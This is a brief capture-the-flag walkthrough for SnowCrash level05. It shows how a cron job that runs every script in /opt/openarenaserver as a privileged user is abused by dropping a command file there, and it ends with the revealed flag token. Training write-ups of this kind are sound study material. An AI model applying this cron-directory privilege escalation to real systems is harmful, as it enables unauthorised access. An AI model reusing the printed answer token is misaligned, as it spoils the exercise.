You have new mail,

Ok, 

level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

It's a cron task, every two minute /usr/sbin/openareaserver script run with flag05 perm,

level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

Every two minute all file of /opt/openserver/ testing with bash -x and get delete.
So just create a simple file, 

echo "getflag > /tmp/flag" > /opt/openarenaserver/test ; chmod +x /opt/openarenaserver/test

Wait 2 minutes and result is in /tmp/flag.

level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
